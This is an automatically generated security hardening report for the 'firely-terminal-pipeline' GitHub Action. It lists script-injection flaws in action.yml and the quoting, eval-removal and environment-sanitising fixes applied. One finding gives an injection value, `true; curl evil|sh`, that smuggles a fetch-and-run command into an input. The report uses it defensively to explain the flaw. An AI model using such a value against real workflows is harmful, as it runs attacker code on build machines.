<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.9.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.9.0** was hardened automatically. 4 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): many steps expand input-derived env vars without quotes, and in some cases run them as commands. Examples: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then` and `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`. In each of these, the shell runs the input value as a command, so a value like `true; curl evil|sh` runs code. This affects nearly every step: Check if .NET is installed, Check .NET SDK Version, Install Firely.Terminal, Check Firely Terminal Version, Simplifier login, Detect FHIR version, Validate FHIR version support, Set FHIR specification, npm/SUSHI steps, Pre-processing, Configure validator engine, Run Quality Control checks, Report Success, Remove package cache, Java steps and Re-run SUSHI.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`

### script-injection (severity: high)

Rule (b): input values are expanded without quotes inside command arguments. Examples: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION` (Install Firely.Terminal); `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD` (Simplifier login); `sudo npm install -g fsh-sushi@$SUSHI_VERSION` (Install fsh-sushi); `sushi $INPUT_SUSHI_OPTIONS` (Generate conformance resources with SUSHI and Re-run SUSHI); `echo $INPUT_EXPECTED_FAILS | grep ...` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES` (Run Quality Control checks).

Locations:

- `action.yml:119`
- `action.yml:143`
- `action.yml:564`
- `action.yml:576`
- `action.yml:677`
- `action.yml:925`

### script-injection (severity: high)

Rule (b): the Download Java Validator step passes an input to eval: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. Here inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION is evaluated by the shell, so `$(...)` or backticks in the value run as commands. The result is then used without quotes in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`.

Locations:

- `action.yml:730`
- `action.yml:733`

### script-injection (severity: high)

Rule (b): both Java validation steps expand input-derived data without quotes. Examples: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES ...`.

Locations:

- `action.yml:780`
- `action.yml:862`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Changes in action.yml:
- Every boolean input that was run as a command (`if $INPUT_X`, `elif $X &&`, `$A || $B`) is now a string check: `[ "$X" = "true" ]`.
- Single values are now quoted: the Firely.Terminal version, the SUSHI version (`"fsh-sushi@$SUSHI_VERSION"`), `$USER`, the Simplifier login arguments, the cache path given to `rm -rf`, and the `FHIR_RESTORE` echo.
- The optional QC rules path now uses `${VAR:+"$VAR"}`.
- `echo $INPUT_EXPECTED_FAILS | grep` is now `printf '%s\n' "$INPUT_EXPECTED_FAILS" | grep`.
- The Java validator download no longer uses `eval`. Only the `$JAVA_VALIDATOR_VERSION` / `${JAVA_VALIDATOR_VERSION}` placeholder in the URL is substituted, by plain string replacement, and wget gets the URL quoted.
- Inputs that are lists (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES) and the IG dependencies read from package.json are now unquoted array assignments. These split and glob the same way upstream's unquoted expansion did, and the arrays are expanded with "${arr[@]}".
- The -ig parameters are built as arrays instead of strings that get split again later.
- In the java command the file paths are quoted up to the glob (`"$GITHUB_WORKSPACE/$p"*.xml`), and `-version "$FHIR_VERSION"` is quoted.

One behaviour change: upstream ran each flag's value as a command, so any value other than exactly `true` already counted as off (`True` failed with "command not found"). The checks now do the same without the error. Only the action itself was changed; files under tests/ were left alone. Nothing was run or tested.

### Iteration 2

**Fixes applied:** github-env-injection

**Notes:**

In action.yml, the 'Detect FHIR version' step now strips CR and LF from fhirVersion before it writes it to $GITHUB_ENV (safeFhirVersion=$(printf '%s' "$fhirVersion" | tr -d '\n\r')). This is an assignment on its own line, not wrapped inside another command substitution, so a failing command can't be hidden. The step's other GITHUB_ENV writes are the literal values true and false, so they were left as they are.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Changed all 9 '# shellcheck disable=SC2206' directives in action.yml to '# shellcheck disable=SC2086' (covering sushi_args, conformance_paths, example_paths, java_opts and ig_deps). The unquoted list splits stay as upstream had them, so word splitting and globbing work the same way.

